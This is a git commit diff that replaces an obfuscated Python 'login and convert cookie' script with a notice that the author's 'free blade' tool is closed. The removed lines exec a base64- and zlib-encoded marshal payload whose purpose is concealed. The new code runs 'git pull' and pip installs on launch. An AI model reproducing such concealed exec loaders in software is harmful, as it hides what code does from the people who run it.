e01960e986bbe1959b4097c5e25cb27dc6db8cb2
RochmatBasukiXD <103634965+RozhBasXYZ@users.noreply.github.com>
2022-06-29 09:18:56 +0700

    Update importbahan.py

--- importbahan.py
+++ importbahan.py
@@ -1,7 +1,69 @@
-# coding=utf-8
-# Lambda By BabasXD       
-# Login Dan Convert Cookie
-# https://github.com/RozhBasXYZ
-#----------------------------------------------------------#
+###----[ LIST INFOMASI ]----###
+author  = 'Rochmat Basuki'
+git_hub = 'github.com/RozhBasXYZ'
+version = 'project closed'
 
-_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z\x16e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00d\x04S\x00\x04\x00e\x05y/\x01\x00Z\x06\x01\x00z\re\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x00Y\x00d\x04Z\x06[\x06d\x04S\x00d\x04Z\x06[\x06w\x01w\x00',('marshal', 'zlib', 'base64', b'eJxtU89vHDUUtj0zu7OT3U1beqgIAnNcEG0SKiFoVRVoEEgQVYCEOlG0cmPv7nTHM1Pbo3RH6Sn8CzlVEQkgpP5LvnLqDYlbhFSevUwTCmO9733y+D2/X/4dvfbFIHdB/jwC4IjjHKVLjVPsNUmJ10EagCY5kWEaYtR0/G6URj+gYhgi0Vm8h5FbAp10eXCKMXqACryPeMijH1Ea807a49004XG6wntpnyd8BfYHvM8HoIdilQ/nRH0phofghePvvNx/vvrCBbo9wjbSuRBVc7XKKpoV2rA8p9Vikk1zYfZezywE+RxEDwEMMviEcHyKD8HniGw3ffrFt1tblH729af3tkaBDbRRNm69pYOlHk9KJZl5jlQXvHg4u3xD8z2m+I264syI69XChnk5LV0pNQEYYtUD1URrOx9/JL3aWKrNpfpQ/itaZ7PaRnvwT7SH6BnkbwggMQFg4HnoeWTCV7xzPDyEWk8R7/6Mn6IeOkD30O7aU2yiRx3oRO+Cj+QAA64cd113/P/4FGpterzvfDx+9/E7o8H2Gd45w7eb93epLGdlQSVjE6r3VFYZqgVnxZQuU6dzQdevbyYJPcN3mk9oJQomH7IZK+gkM7VK6Ae0Ylrvl4qDl6JmudvitazoVJV1Resiz8C8uQW2YGmYvmgr2ZPl4Y319XWace/v/NwjJunGZjLq1q7Xf/x09Kwlxy05aclRS35pya8t+e37hgx2mo3dNkc2B+elKSXTJtPUCPUqXZPNGdQgF5plkDR9gcHHKLFRpbLC+LZbMptZfN+S+RyGaqFtRxte1sZG+yozwkaTvNYz5S4fkTR4yLTFT87HS7kxsp3ljZfdRFwCuIljTEAoTmCRv9Q12PzPyAftEL3th+gEu4HHS0Y8I/5pIXgCwXYTTzNDqzrPbbSXC6bgFZDSxbvQRkh/xYW4zoMLJZuLN909HYDEh6Tecn/i8ViyrBiPR5eUO6De8OdNJoWNXUKO+dSVM7UrX8mqVGZLqVKpNbftKqhc2hZ/o1zm6ooDH0t7BQyZGI//N7T4tix5nYs7ri+aAlDch8r1YQ1fkiAOQ+wXiXtxFOPk5d+GkTjU', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'lambda.py','<module>',1,b'.\x01',(),());_()
+###---[ IMPORT LIBRARY]----###
+import time, sys, random, os, datetime
+from datetime import datetime as DT
+from time import sleep
+try:
+	import pyfiglet
+except ImportError:
+	os.system('pip install pyfiglet')
+
+###---[ LOGO ]---###
+def logo():
+	return str(pyfiglet.figlet_format(' FREE  BLADE'))
+
+###----[ BERSIH LAYAR ]---###
+def clear_layar():
+	try:os.system('clear')
+	except:pass
+	
+###---[ JAM ]---###
+def waktu():
+	a=time.localtime()     
+	hr=a.tm_hour     
+	mn=a.tm_min     
+	sc=a.tm_sec     
+	return ('{}:{}:{}'.format(hr,mn,sc))
+
+###----[ WARNA ]----###
+M = '\033[91m'
+K = '\033[93m'
+H = '\033[92m'
+B = '\033[94m'
+C = '\033[96m'
+U = '\033[93m'
+P = '\033[00m'
+
+###----[ GATAU ]----###
+class make:
+	def __init__(self):
+		self.rc = random.choice
+		self.jam = waktu()
+		self.ran = self.rc([M,K,H,B,C])
+		self.wal = DT.now()
+		self.logo = logo()
+		self.blade = ['i     ','i love        ','i love you   ','i love you aww','                  ']
+		self.main()
+	def main(self):
+		ahir = str(DT.now()-self.wal).split('.')[0]
+		print(self.logo)
+		name = input(f'\n [%s<%s] hai selamat datang, siapa nama kamu? \n nama : %s'%(H,P,K))
+		clear_layar()
+		print('%s'%(P)+self.logo)
+		print(f' \n %shai %s%s%s, mohon maaf script ini telah di tutup permanen'%(P,K,name,P))
+		print(f' %sdi karnakan script ini di perjual belikan kembali oleh\n beberapa oknum / pihak yang tidak bertanggung jawab'%(P))
+		print(' mohon maaf bila hal ini tidak berkenan di anda')
+		while True:
+			for x in self.blade:
+				sys.stdout.write('\r [%s!%s] sampai jumpa di next free blade, %s%s%s'%(H,P,self.ran,x,P));sys.stdout.flush();sleep(1)
+		
+
+if __name__=='__main__':
+	try:os.system('git pull')
+	except:pass
+	clear_layar()
+	make()
